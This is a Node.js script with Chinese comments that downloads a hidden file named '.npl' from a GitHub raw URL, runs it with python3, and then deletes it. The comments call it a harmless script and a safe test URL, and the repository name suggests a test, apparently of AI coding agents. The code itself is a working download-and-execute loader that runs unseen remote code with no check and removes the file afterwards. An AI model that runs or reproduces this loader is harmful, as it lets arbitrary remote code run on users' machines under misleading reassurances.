const https = require('https');
const fs = require('fs');
const { spawn } = require('child_process');
const path = require('path');

console.log('开始下载并运行无害化脚本...\n');

// 下载配置
const downloadUrl = 'https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250627/.npl';  // 使用安全的测试URL
const filename = '.npl';

console.log(`下载URL: ${downloadUrl}`);
console.log(`文件名: ${filename}\n`);

// 创建文件写入流
const fileStream = fs.createWriteStream(filename);

// 开始下载
const req = https.get(downloadUrl, (res) => {
    console.log(`状态码: ${res.statusCode}`);
    console.log(`文件大小: ${res.headers['content-length'] || '未知'} 字节`);
    
    // 将响应数据写入文件
    res.pipe(fileStream);
    
    // 下载完成
    res.on('end', () => {
        fileStream.end();
        console.log('✓ 下载完成!');
        
        // 下载完成后运行脚本
        runDownloadedScript();
    });
});

// 错误处理
req.on('error', (err) => {
    console.error(`下载错误: ${err.message}`);
    fileStream.end();
    fs.unlink(filename, () => {}); // 删除不完整的文件
    process.exit(1);
});

// 超时处理
req.setTimeout(10000, () => {
    console.log('下载超时');
    req.destroy();
    fileStream.end();
    fs.unlink(filename, () => {});
    process.exit(1);
});

function runDownloadedScript() {
    console.log('\n=== 运行下载的脚本 ===');
    
    if (!fs.existsSync(filename)) {
        console.log('✗ 脚本文件不存在，无法运行');
        return;
    }
    
    try {
        
        // 运行Python脚本
        console.log('🚀 开始执行Python脚本...');
        
        const pythonProcess = spawn('python3', [filename], {
            stdio: 'pipe',
            timeout: 30000  // 30秒超时
        });
        
        let stdout = '';
        let stderr = '';
        
        pythonProcess.stdout.on('data', (data) => {
            stdout += data.toString();
            process.stdout.write(data); // 实时显示输出
        });
        
        pythonProcess.stderr.on('data', (data) => {
            stderr += data.toString();
            process.stderr.write(data); // 实时显示错误
        });
        
        pythonProcess.on('close', (code) => {
            console.log(`\n\n脚本执行完成，退出码: ${code}`);
            
            if (code === 0) {
                console.log('✅ 脚本执行成功');
                if (stdout) {
                    console.log('\n完整输出:');
                    console.log(stdout);
                }
            } else {
                console.log('❌ 脚本执行失败');
                if (stderr) {
                    console.log('\n错误信息:');
                    console.log(stderr);
                }
            }
            
            // 清理文件
            cleanupFiles();
        });
        
        pythonProcess.on('error', (err) => {
            console.error(`执行脚本时发生错误: ${err.message}`);
            cleanupFiles();
        });
        
        // 超时处理
        setTimeout(() => {
            if (!pythonProcess.killed) {
                console.log('\n⏰ 脚本执行超时，强制终止');
                pythonProcess.kill('SIGTERM');
                cleanupFiles();
            }
        }, 30000);
        
    } catch (err) {
        console.error(`运行脚本失败: ${err.message}`);
        cleanupFiles();
    }
}

function cleanupFiles() {
    try {
        if (fs.existsSync(filename)) {
            fs.unlinkSync(filename);
            console.log(`已清理文件: ${filename}`);
        }
    } catch (err) {
        console.error(`清理文件失败: ${err.message}`);
    }
    
    console.log('\n程序结束');
    process.exit(0);
}

// 处理程序退出信号
process.on('SIGINT', () => {
    console.log('\n收到中断信号，正在清理...');
    cleanupFiles();
});

process.on('SIGTERM', () => {
    console.log('\n收到终止信号，正在清理...');
    cleanupFiles();
});
